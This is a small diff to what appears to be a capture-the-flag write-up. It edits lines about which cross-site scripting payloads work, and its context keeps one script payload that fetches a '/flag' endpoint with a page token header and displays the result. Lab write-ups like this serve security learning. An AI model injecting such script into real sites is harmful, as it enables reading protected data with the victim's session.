@@ -45,6 +45,4 @@ both of the above payload works
 <script>fetch('/flag', {headers:{'X-Flag-Token':window.FLAG_TOKEN}}).then(r=>r.text()).then(alert)</script>
 ```
 
-this payload won't work because of execution order
-
-payloads i used
+this payload won't work because of execution order.
